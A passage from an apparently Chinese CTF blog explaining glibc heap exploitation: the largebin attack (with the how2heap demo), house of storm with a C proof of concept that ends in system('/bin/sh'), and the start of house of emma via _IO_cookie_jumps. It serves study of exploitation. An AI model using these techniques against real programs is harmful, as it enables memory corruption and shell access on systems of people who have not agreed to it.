fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">              == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>在 2.29 及以下的版本中，根据 unsorted chunk 的大小不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>在 unsorted chunk 小于链表中最小的 chunk 的时候会执行前一句，反之执行后一句。</p><p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">              == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><p>所以有两种利用方法。</p><p>在 2.30 版本新加入了对 largebin 跳表的完整性检查，使 unsorted chunk 大于链表中最小的 chunk 时的利用失效，必须使 unsorted chunk 小于链表中最小的 chunk，通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>实现利用，也就是将本 chunk 的地址写到 <code>bk_nextsize + 0x20</code> 处。</p><h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</span><br><span class="line">// then</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addr2-&gt;fd_nextsize = victim;</span><br><span class="line">// 等价于</span><br><span class="line">*(addr2+4) = victim;</span><br></pre></td></tr></table></figure><p>所以修改了 <code>stack_var2</code> 的值。</p><p>接着还存着另外一个利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">// ......</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line">// 等价于</span><br><span class="line">(fwd-&gt;bk)-&gt;fd = victim;</span><br><span class="line">// 等价于</span><br><span class="line">*(addr1+2) = victim;</span><br></pre></td></tr></table></figure><p>修改了 <code>stack_var1</code> 的值。</p><p>至此利用完毕。由于最后分配的还是 small bin 中的 chunk，与 large bin 中的 chunk 也无关了。</p><p><strong>利用条件：</strong></p><ul><li><strong>可以修改一个 large bin chunk 的 data</strong></li><li><strong>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</strong></li></ul><p><strong>利用效果:</strong></p><ul><li>*(large_chunk-&gt;bk+2)=victim</li><li>*(large_chunk-&gt;bk_nextsize+4)=victim</li></ul><p><strong>利用手法:</strong></p><ul><li><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</p></li><li><p>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</p></li></ul><h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p><strong>漏洞利用条件:</strong></p><ol><li>glibc版本小于2.30,因为2.30之后加入了检查</li><li>需要攻击者在 <code>large_bin</code> 和 <code>unsorted_bin</code> 中分别布置一个chunk 这两个chunk需要在归位之后处于同一个 <code>largebin</code> 的index中,<strong>且 <code>unsorted_bin</code> 中的chunk要比 <code>large_bin</code> 中的大</strong></li><li>需要 <code>unsorted_bin</code> 中的 <code>bk指针</code> 可控</li><li>需要 <code>large_bin</code> 中的 <code>bk指针和bk_nextsize</code> 指针可控</li><li>开启了pie,不开启也能但不如用其他方法</li></ol><p>相较于largebin attack多了一个unsorted_chunk-&gt;bk条件</p><hr><p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p><p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构 才会有后续的验证。</strong></p><p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。明确了任务 下面就配合实例来具体讲解一下怎么构造</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p><p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p><p>0x55 : <code>1010101</code></p><p>0x56 : <code>1010110</code></p><p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure><p>可以看出只有高位为0x56的情况下能通过检测</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>参考<a href="https://bbs.kanxue.com/thread-270429.htm">[原创]【伽玛】第七届“湖湘杯” House _OF _Emma | 设计思路与解析-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，我无法构造出任意地址申请。</p><p>因此在新版中各种各样的限制下,迫使利用者转变思路：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：<strong>在某处写一个可控地址直接 Getshell（借助于 IO_FILE）</strong>。</p><p>显而易见的，后者的所需条件一定是少于前者的。</p><p>但是在新版本 glibc 下的 IO_FILE 攻击中，通常还是借助这两个 Hook 来辅助进行攻击，但并不适用于 GLIBC 2.34 版本，因此急需发现一个类似于<strong>__free_hook</strong> 这样的函数指针调用，从而来削弱 Getshell 的限制条件。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</li><li>可以触发 IO 流（FSOP、<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>）</li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 